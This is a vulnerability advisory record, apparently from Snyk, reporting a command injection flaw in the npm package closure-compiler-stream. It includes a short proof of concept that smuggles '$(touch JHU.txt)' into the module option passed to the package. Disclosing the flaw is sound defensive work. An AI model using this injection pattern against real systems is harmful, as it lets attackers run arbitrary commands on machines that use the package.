---
- id: snykio:npm:closure-compiler-stream:560123
  title: Command Injection
  description: |
    [closure-compiler-stream][1] is a Streaming interface for closure
    compiler.

    Affected versions of this package are vulnerable to Command Injection.
    The argument `options` of the exports function in `index.js` can be
    controlled by users without any sanitization.

    ### PoC   {#poc}

        var root = require("closure-compiler-stream");
        var gulp = require("gulp");
        var options = {
           module:[[123],[ "$(touch JHU.txt)"]]
        }
        gulp.src("./closure-compiler-stream.js")
          .pipe(root(options));



    [1]: https://www.npmjs.com/package/closure-compiler-stream
